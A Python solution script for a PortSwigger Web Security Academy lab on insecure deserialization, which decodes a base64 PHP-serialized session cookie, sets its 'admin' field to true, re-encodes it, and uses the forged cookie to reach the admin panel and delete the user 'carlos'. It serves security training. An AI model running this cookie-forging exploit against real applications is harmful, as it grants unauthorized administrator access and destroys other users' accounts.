"""
Lab 1: Modifying serialized objects
https://portswigger.net/web-security/deserialization/exploiting/lab-modifying-serialized-objects
Difficulty: Apprentice

📝 The session cookie is base64-encoded PHP serialized data with an
"admin" boolean field. Decode, flip the field, re-encode, replace the
cookie.
"""

import base64

from utils import get_session, log, note, modify_php_serialized_field

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def run():
    s = get_session()
    r = s.post(f"{TARGET}/login", data=WIENER)
    cookie = s.cookies.get("session")
    log(f"Got session cookie: {cookie}")

    decoded = base64.b64decode(cookie).decode()
    note(f"Decoded serialized object: {decoded}")

    modified = modify_php_serialized_field(decoded, "admin", True)
    note(f"Modified: {modified}")

    new_cookie = base64.b64encode(modified.encode()).decode()
    s.cookies.set("session", new_cookie)

    r = s.get(f"{TARGET}/admin")
    log(f"/admin status: {r.status_code}")
    if r.status_code == 200:
        r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
        log(f"Delete carlos responded {r.status_code}")


if __name__ == "__main__":
    run()
